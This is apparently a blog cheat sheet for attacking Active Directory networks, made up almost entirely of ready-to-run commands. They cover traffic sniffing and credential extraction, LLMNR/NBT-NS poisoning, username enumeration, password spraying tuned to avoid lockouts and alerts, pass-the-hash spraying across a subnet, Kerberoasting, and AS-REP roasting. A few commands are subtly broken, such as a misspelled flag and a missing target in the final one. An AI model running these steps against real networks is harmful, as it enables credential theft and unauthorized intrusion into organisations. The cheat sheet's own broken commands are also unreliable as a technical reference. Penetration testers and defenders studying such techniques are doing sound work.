---
title: "Active Directory"
date: 2025-08-23
categories: ["Active Directory", "MiTM"]
tags: ["Active Directory"]
description: ""
---

# ** 1. Initial Enumration and Identification **

### a. Wireshark
```bash
sudo -E wireshark
```

>Choose the ethernet we want to sniff on
>  
>Filter for `ARP` protocol
>
>Look for NETBIOS names
>
>Look for DNS and domain names
>
>Look for unsecure protocols such as TELNET and FTP

### b. TCPdump
```bash
sudo tcpdump -i eth0 -w capture.pcap
```

> Choose the ethernet we want to sniff on
>
> Saves the output in .pcap file

### c. Net-Creds
```bash
sudo python net-creds.py -f capture.pcap
```

> Install [net-creds](https://github.com/DanMcInerney/net-creds)
> Search for credentials in the .pcap file

### d. Responder
```bash
sudo responder -I eth0 -A
```

> Choose the ethernet we want to analyze traffic on
>
> Analyze mode to see NBT-NS, Browser and LLMNR requests without responding

### e. Utilizing DNS to gather Domain Controllers
```bash
cat /etc/resolv.conf - internal domain dotpirate.local  
  
dig -t SRV _gc._tcp.dotpirate.local  
dig -t SRV _ldap._tcp.dc._msdcs.dotpirate.local  
dig -t SRV _kerberos._tcp.dotpirate.local  
dig -t SRV _ldap._tcp.dotpirate.local
```

> Replace `dotpirate.local` with the domain name assigned to `resolv.conf` file

### f. Enumerating AD CS / CA Authority
```bash
openssl s_client -showcerts -connect <dc-ip>:3269 | openssl x509 -noout -text | less -S 
```

> Replace `<dc-ip>` with the Domain Controller IP 

***


# **2. LLMNR/NBT-NS Poisoning**

### a. From Linux
```bash
sudo responder -I eth0
```

> Start poisoning with reposnder on default settings

### b. From Windows
```c
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

> LLMNR and NBNS spoofing
>
> Inveigh [Documentation](https://github.com/Kevin-Robertson/Inveigh#parameter-help) and default options


***


# ** 3. Username Enumeration (on Domain Controller)

### a. Kerberos
```bash
sudo ntpdate -s dotpirate.local
./kerbrute_linux_amd64 userenum -d DOTPIRATE.LOCAL --dc <dc-ip> wordlist.txt -o valid-ad-users.txt
```

> Make sure to synchonize time with DC
>
> Replace domain controller IP with `<dc-ip>`
>
> Replace `wordlist.txt` with [this](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt) or with a smaller one such as [this](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) 
>
> Kerberos pre-authentication failures often will not trigger logs or alerts.
>
> Download and Installed the binary from [here](https://github.com/ropnop/kerbrute/releases)

### b. enum4linux SMB NULL Session 
```bash
enum4linux -U <dc-ip>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

> Filtering the output to grab only the users.
>
> Replace `<dc-ip>` with Domain Controller IP

### c. rpcclient SMB NULL Session
```bash
rpcclient -U "" -N <dc-ip>
rpcclient? $> enumdomusers
```

> Utilizing RPC to enumerate valid users.

### d. netexec rid bruteforce
```bash
netexec smb <dc-ip> -u '' -p '' --rid-brute
```

> Bruteforcing rid to gather users and groups

### e. netexec --users flag
```bash
netexec smb <dc-ip> --users
```

> Gives more information that just a list of users


### f. ldapsearch LDAP Anonymous bind
```bash
ldapsearch -h <dc-ip> -x -b "DC=DOTPIRATE,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

> Utilizing ldapsearch with a custom query to gather users from the `SAMAccountName` property

### g. windapsearch LDAP Anonymous bind
```bash
./windapsearch.py --dc-ip <dc-ip> -u "" -U
```

> `-u` flag is to spcify a user whil `-U` is to search for users.



***

# ** 4. Password Spray **

### a. rpcclient password spray
```bash
PASSWORD="Welcome2025"
for u in $(cat valid_users.txt); do 
    rpcclient -U "$u%$PASSWORD" -c "getusername;quit" <dc-ip> | grep Authority
    sleep 5
done
```

> Utilizing bash for loop and rpcclient with single password
>
> `sleep 5` (or even 10–15 sec) gives breathing room and avoids triggering threshold-based lockouts.
>
> Replace `<dc-ip>` with target DC

### b. kerberos password spray (safer)
```bash
kerbrute passwordspray -d dotpirate.local --dc <dc-ip> ad_users.txt  Welcome2025
```

> Kerbrute is lockout-safe by design (it only attempts Kerberos pre-auth, which doesn’t increment bad password counters in AD)
>
> Replace `<dc-ip>` with target DC

### c. netexec password spray
```bash
netexec smb 10.10.10.11 -u users.txt -p 'Welcome2025' \
  --no-bruteforce \
  --ufail-limit 3 \
  --gfail-limit 10 \
  --jitter 3 \
  -t 1
```

> `--no-bruteforce LIMIT` ensures it does not try user1=password1, user2=password2, etc. (so it only sprays the single password against the whole list).
>
> `--ufail-limit LIMIT` max failures per user before it stops (e.g., --ufail-limit 3 so you don’t risk lockouts).
>
> `--gfail-limit LIMIT` global cap on failures across all attempts.
>
> `--jitter INTERVAL` adds random delays between attempts, reducing the chance of triggering lockouts.
>
> `-t THREADS` adjust concurrency (lower = slower, safer).

### d. netexec Local Administrator spray
```bash
netexec smb --local-auth 10.10.10.0/23 -u administrator -H 111109182de666ddd6579eb084977777 -t 1 --jitter 2 --fail-limit 10 | grep +
```

> Spray the hash against every host in the subnet specified
>
> One attempt at a time with random delay between attempts
>
> `--fail-limit` to cap attempts if it’s failing everywhere

### e. Password Spray from domian-joined Windows-Host
```c
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome2025 -OutFile output.txt -ErrorAction SilentlyContinue
```

> Automatically generate a user list from Active Directory
>
> Query the domain password policy
>
> Exclude user accounts within 1 attempt of locking out
>
> Download and Import [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

# ** 5. Kerberoasting and AS-REP Roasting **

### a. Kerberoast with user list
```bash
sudo impacket-GetUserSPNs -no-preauth "anyknownuser" -usersfile users.txt -dc-host <dc-ip> "dotpirate.local"/
```

> Request Kerberos service tickets for any service account with a Service Principal Name (SPN)

#### b. AS-REP Roasting
```bash
sudo impacket-GetNPUsers dotpirate.local/ -dc-ip <dc-ip> -request
```

> Checks if Kerberos pre-authentication is disabled.

# ** 6. Bruteforce Username as Password **
* Note: IF we found valid ad users we can use the usernames as passwords *
```bash
sudo netexec smb -u ad-users.txt -p ad-users.txt --no-bruteforce --continue-on-succes
```